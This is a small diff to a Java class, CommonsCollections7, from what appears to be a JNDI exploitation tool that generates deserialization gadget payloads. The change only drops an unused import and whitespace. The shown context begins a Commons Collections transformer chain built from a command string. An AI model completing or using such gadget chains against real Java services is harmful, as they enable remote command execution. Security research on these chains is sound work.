@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
@@ -20,7 +19,7 @@ import java.util.Map;
 public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 
     public Hashtable getObject(String command) throws Exception {
-        
+
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
